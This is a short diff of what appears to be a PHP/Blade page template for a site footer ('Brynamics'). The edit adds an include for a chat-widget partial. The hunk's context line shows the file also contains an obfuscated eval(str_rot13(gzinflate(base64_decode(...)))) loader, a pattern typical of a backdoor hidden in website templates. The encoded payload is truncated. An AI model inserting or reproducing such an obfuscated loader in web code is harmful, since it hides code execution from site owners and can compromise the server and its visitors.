@@ -74,5 +74,6 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUjFEoZVDn6aqZm94UV7wuXHHS5buL
     <div class="content has-text-centered">
       <p>Copyright <?php echo date('Y'); ?> Brynamics, All rights reserved.</p><br>
     </div>
-  </body>
+  @include('partials.smartsupp')
+</body>
 </html>
